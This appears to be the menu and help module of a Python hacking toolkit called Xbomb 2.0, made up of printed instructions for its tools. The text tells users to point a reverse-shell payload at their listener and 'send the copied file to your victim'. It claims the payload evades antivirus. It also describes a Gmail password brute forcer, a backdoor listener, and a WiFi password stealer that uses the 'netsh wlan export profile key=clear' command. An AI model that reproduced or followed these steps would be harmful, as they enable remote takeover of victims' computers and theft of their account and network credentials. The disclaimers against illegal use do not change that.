from colored import fg, attr
import time

green = fg("green")
blue = fg("blue")
red = fg("red")
reset = attr("reset")

def payload():
    print(green + "[@] Instructions for making the payload")
    print(" ")
    print(green + "    [+] Browse to the 'payload.py' located in the Xmomb folder")
    print(green + "    [+] Go to the 10th line ")
    print(green + "    [+] Find th word 'host' and 'port' ")
    print(green + "    [+] Replace the 'host' word with the ip of your listener  ")
    print(green + "           [+] Put the ip inside single codes (Refer the example given ")
    print(green + "    [+] Replace the 'port' word with the port of your listener  ")
    print(green + "           [e] c.connect(('192.168.1.11', 4444 ")
    print(green + "    [+] Go to the end of the fie, type 'payload()' at the starting end of the last line of the file")
    print(green + "    [+] Save the file by pressing 'Ctrl + s' ")
    print(green + "    [+] Copy the file to another folder")
    print(green + "    [+] Send the copied file to your victim")
    print(green + "    [#] Make sure that your listener is active when the victim opens the file" + reset)


def help():
    print(green + "Xbomb 2.0")
    print(" ")
    print(green + " [%] Help")
    print(" ")
    print(green + "       [=] list - list shell options     ")
    print(green + "       [=] info <number> - show basic information about the option ([ex] info 2)   ")
    print(green + "       [=] use <number> - use the certain option ([ex] use 1)         ")
    print(green + "       [=] shell - perform terminal commands through the Xbomb framework")
    print(green + "       [=] back - to return the Xbomb shell when you are inside another attack shell"
                  " (Password hasher, Network Scanner)")
    print(green + "       [=] help - show this help menu            ")
    print(green + "       [=] credits - show credits            ")
    print(green + "       [=] exit - exit Xbomb" + reset)
    print("")


def credit():
    print(green + "Xbomb 2.0")
    print(" ")
    print(green + " [$] Credits")
    print("    ")
    print(green + "     [#] This is a penetration testing tool which can be used for different kind of attacks. ")
    print(green + "     [#] This tools is written by Python programming language")
    print(green + "     [#] This can be used in different platforms such WINDOWS, MAC ,ISO, UNIX/LINUX etc")
    print(green + "     [#] Requirements   - [+] Python 3.8 or a higher version")
    print(green + "                          [+] Python libraries - python-nmap, socket, smtplib, colored ")
    print(green + "                          [+] You can install this libraries in this website 'https://PyPi.org/'")
    print(green + "                          [+] Or install by the terminal by typing 'pip install <lib_name>' ")
    print(green + "                                   [ex] pip install colored, pip3 install colored")
    print(green + "     [#] This tool is also provided with a wordlist with 10 000 passwords (wordlist.txt)")
    print(green + "     [#] You can use a wordlist of your preference.")
    print("     [#] You must copy the wordlist to the Xbomb folder to use the wordlist")
    print(" ")
    print(blue + "                                                         [A] Author - Kavishka Gihan Fernando")
    print(blue + "                                                         [A] Follow me on Instagram - @_kavi.gihan")
    print(blue + "                                                         [A] Subscribe on Youtube - Computing lk")
    print(red + " -------------------------------------------------------------------------- ")
    print(red + " | [*#*] PLEASE USE THIS LEGALLY.DONT USE THIS FOR ILLEGAL PURPOSES. [*#*]   |")
    print(red + " |  [*#*] I WONT BE RESPONSIBLE FOR ANY OF YOUR ILLEGAL ACTIVITIES. [*#*]     |")
    print(red + " -------------------------------------------------------------------------- " + reset)


def info_1():
    print(green + "[I] info - Password hasher ")
    print('   ')
    print(green + '     [#] This is used to make the hash of a plain text password')
    print(green + '     [#] This changes the plain text word to a hash according to a specified algorithm')
    print(green + "     [#] There are 5 algorithms available (SHA 1, SHA256, MD5, SHA 224, SHA 384)" + reset)


def info_2():
    print(green + "[I] info - Network Scanner")
    print('   ')
    print(green + '     [#] This is used to scan networks')
    print(green + "     [#] There are 7 different types of scans you can perform using this Network Scanner")
    print(green + "            [1] Single host scan - to scan for open ports and handshakes of one host")
    print(green + "            [2] Host state scan -  to scan whether a host is up or not")
    print(green + "            [3] Port state scan -  to know the ports are open or not")
    print(green + "            [4] Protocol scan - to know the protocols running on ports")
    print(green + "            [5] Open port scan - to scan for open ports")
    print(green + "            [6] Soft scan - to scan a host faster for less details")
    print(green + "            [7] Aggressive scan - to scan a host or a range of hosts for much details")
    print(" ")
    print(red + "     [#] Scanning others networks without permission is completely illegal [#]" + reset)


def info_3():
    print(green + "[I] info - Gmail Brute Forcer")
    print(" ")
    print("     [#] This is used to brute force the gmail passwords")
    print("     [#] You are provided with a pre-installed word list for brute forcing (wordlist.txt).")
    print("     [#] If you need to use a different one, copy the .txt file to the Xbomb folder")
    print("     [#] This tool might not work for protected gmail addresses ")
    print("")
    print(" [+] Brute Forcing other's gmail addresses without any permission is completely illegal [+]" + reset)


def info_4():
    print(green + "[I] info - WiFi Stealer")
    print(" ")
    print("     [#] This is a automated WiFi stealer")
    print("     [#] This WiFi stealer will find the all hidden and stored WiFi passwords in the system")
    print("     [#] Files with the hash password will be saved in the path you specified")
    print("     [#] Follow these steps")
    print("                    [1] Open the file in the Note pad ")
    print("                    [2] Find the '<key/material>' tag ")
    print("                    [3] Hashed password will be inside those tags")
    print("     [#] If you want the plain text password,")
    print("                    [1] Run CMD in administrator mode  ")
    print("                    [1] Type 'netsh wlan export profile key=clear folder=<path>' ")
    print("     [#] This will only work in windows operating systems" + reset)


def info_5():
    print(green + "[I] info - Listener")
    print(" ")
    print("     [#] This will create a backdoor listener")
    print("     [#] By this you will be able to connect to your victims computer without even touching his/her computer")
    print("     [#] First you must create a payload by using option 6 (use 6) " + reset)


def info_6():
    print(green + "[I] info - Payload")
    print(" ")
    print("     [#] This is the file that you must send to your victim")
    print("     [#] File is written with python so anti-viruses won't detect it as a virus")
    print("     [#] Once the victim opens this file the machine reconnect to to your listener")
    print("     [#] Make sure you put the same ip and the port in both listener and the payload")
    print("     [#] Keep the listener active to let the payload to reconnect to your machine")
    print("     [#] This file will only work in machines which python is installed" + reset)


def exit():
    time.sleep(1)
    print(" ")
    print(blue + "            [+] Hope you enjoyed Xbomb [+]")
    time.sleep(2)

    print(" ")
    print(blue + "         ---------------------------------------------------------- ")
    print(blue + "        | Always remember, Hacking is not just hacking a password. |")
    time.sleep(4)
    print(blue + "        | Hacking is hacking a mind.                               |")
    print(blue + "         ---------------------------------------------------------- ")
    time.sleep(3)

    print(red + "           ---------------------------------- ")
    print(red + "          |  As you know Hacking is illegal. |")
    time.sleep(3)
    print(red + "          |  So see you in the hell.         |")
    print(red + "           ---------------------------------- ")
    time.sleep(2)
    print(red + "                                              :)    " + reset)
